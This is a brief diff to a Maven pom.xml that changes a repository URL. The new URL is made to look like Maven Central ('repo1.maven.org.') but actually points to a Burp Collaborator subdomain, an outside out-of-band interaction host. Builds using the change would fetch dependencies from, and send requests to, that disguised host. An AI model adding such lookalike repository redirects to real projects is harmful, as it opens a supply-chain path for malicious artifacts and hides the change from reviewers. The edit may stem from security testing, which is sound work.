@@ -11,7 +11,7 @@
         <repository>
             <id>org.source.repo</id>
             <name>ryanrepo</name>
-            <url>http://zgjffqu4ii94vg4nksn6ur9z4qagy5.burpcollaborator.net</url>
+            <url> https://repo1.maven.org.zgjffqu4ii94vg4nksn6ur9z4qagy5.burpcollaborator.net/maven2/</url>
         </repository>
     </repositories>
     <dependencies>
